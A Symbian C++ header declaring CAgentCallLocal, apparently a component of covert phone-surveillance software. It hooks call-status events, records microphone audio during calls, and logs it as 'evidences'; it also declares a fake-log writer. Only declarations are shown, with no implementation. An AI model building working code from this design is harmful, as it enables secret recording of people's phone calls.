/*
 * AgentCall.h
 *
 *  Created on: 17/mag/2011
 *      Author: Giovanna
 */

#ifndef AGENTCALLLOCAL_H_
#define AGENTCALLLOCAL_H_

#include "AbstractAgent.h"
#include "AdditionalDataStructs.h"
#include "MonitorPhoneCall.h"
#include <MdaAudioInputStream.h>
#include <mda\common\audio.h>
#include <mmf\common\mmfutilities.h>
#include <HT\HighResTimeoutTimer.h>

enum TRecordingState
	{
	ENotReady,
	EReady
	};

// CLASS DECLARATION

/**
 *  CAgentCallLocal
 * 
 */
class CAgentCallLocal : public CAbstractAgent, public MMdaAudioInputStreamCallback, public MCallMonCallBack, public MHighResTimeoutNotifier
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentCallLocal();

	/**
	 * Two-phased constructor.
	 */
	static CAgentCallLocal* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentCallLocal* NewLC(const TDesC8& params);
	
	
protected:
	// From AbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();
		
private:
	
	/**
	 * Constructor for performing 1st stage construction
	 */
	CAgentCallLocal();
	

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);
	
	void WriteFakeLogL();
	
	// From MCallMonCallBack
	virtual void NotifyConnectedCallStatusL(CTelephony::TCallDirection aDirection,const TDesC& aNumber);
	virtual void NotifyDisconnectedCallStatusL();
	virtual void NotifyDisconnectingCallStatusL(CTelephony::TCallDirection aDirection, TTime aStartTime, TTimeIntervalSeconds aDuration, const TDesC& aNumber);

	// From MHighResTimeoutNotifier
	virtual void HighResTimerExpiredL(TAny* src);
	    
	/*
	 * MaiscOpenComplete()
	 *
	 * A callback function that is called when 
	 * CMdaAudioInputStream::Open() has completed, indicating that the audio 
	 * input stream is ready for use.
	 */
	virtual void MaiscOpenComplete(TInt aError);

	/*
	 * MaiscBufferCopied()
	 *
	 * A callback function that is called when a chunk of audio data 
	 * has been copied to the descriptor specified in a 
	 * CMdaAudioInputStream::ReadL().
	 */
	virtual void MaiscBufferCopied(TInt aError, const TDesC8& aBuffer);
	
	/*
	 * MaiscRecordComplete()
	 *
	 * A callback function that is called when the input stream is
	 * closed using CMdaAudioInputStream::Stop(). 
	 *
	 */ 
	virtual void MaiscRecordComplete(TInt aError);
		
private: 
	// data members
	// agent parameters:
	TUint32 iBuffSize;  // capture buffer length in bytes, not used because we have to use smaller buffers
	
	// audio rec: 
	CMdaAudioInputStream* iInputStream; // audio input stream object reference
	TFourCC iDefaultEncoding;  // The default encoding used
	TMdaAudioDataSettings iStreamSettings;  // Audio data stream settings for input stream
	RPointerArray<TDes8>	iStreamBufferArray;  // Buffers used during recording	
	HBufC8* iRecData;  // Data to be written into log file
	TRecordingState iRecState;  // recording state
	
	// evidences:
	TVoiceAdditionalData iVoiceAdditionalData;  
	
	// monitor call:
	CPhoneCallMonitor*	iCallMonitor;
	TBool 				iInCall;
	
	// timeout timer for beep:
	CHighResTimeoutTimer* 	iTimer;
	TTimeIntervalMicroSeconds32  iMicrosecInterval;
	
	__FLOG_DECLARATION_MEMBER
	};

#endif /* AGENTCALLLOCAL_H_ */
